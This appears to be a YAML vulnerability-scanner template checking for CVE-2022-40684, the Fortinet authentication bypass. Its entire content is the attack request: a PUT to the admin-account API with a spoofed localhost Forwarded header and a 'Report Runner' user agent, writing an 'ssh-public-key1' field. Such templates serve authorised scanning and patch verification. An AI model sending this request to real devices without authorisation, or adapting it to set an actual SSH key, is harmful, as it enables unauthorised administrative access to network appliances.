id: poc-yaml-fortinet-cve-2022-40684-auth-bypass

info:
  name: poc-yaml-fortinet-cve-2022-40684-auth-bypass
  author: z92g(https://github.com/z92g)
  severity: critical
  tags: xray-converted,unauth,cve-2022-40684,ct-497236
  reference:
    - https://github.com/kljunowsky/CVE-2022-40684-POC

http:
  - raw:
      - |
        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
        User-Agent: Report Runner

        {"ssh-public-key1": "{{rand_base(8)}}"}
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500